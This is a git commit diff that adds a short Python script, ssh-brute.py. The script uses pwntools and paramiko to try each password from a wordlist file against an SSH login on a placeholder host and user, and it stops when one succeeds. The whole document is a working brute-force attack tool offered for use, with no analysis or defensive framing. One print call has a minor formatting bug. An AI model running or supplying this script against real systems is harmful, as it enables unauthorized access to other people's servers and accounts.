d24adb5a5e331fd76d87b65d44e9a792912f6537
bbgx <bernardo_bugmann@protonmail.com>
2022-09-13 18:42:01 -0700

    Add project, requirements and password sample

---
+++ ssh-brute.py
@@ -0,0 +1,21 @@
+from pwn import *
+import paramiko
+
+host = "ip"
+username = "user"
+attempts = 0
+
+with open("ssh-common-password.txt", "r") as password_list:
+	for password in password_list:
+		password = password.strip("\n")
+		try:
+			print("[{}] Attempting password: '{}'!".format(attempts, password))
+			response = ssh(host=host, user=username, password=password, timeout=1)
+			if response.connected():
+				print("[>] Valid password found: '{}'!", format(password))
+				response.close()
+				break
+			response.close()
+		except paramiko.ssh_exception.AuthenticationException:
+			print("[X] Invalid password!")
+		attempts += 1
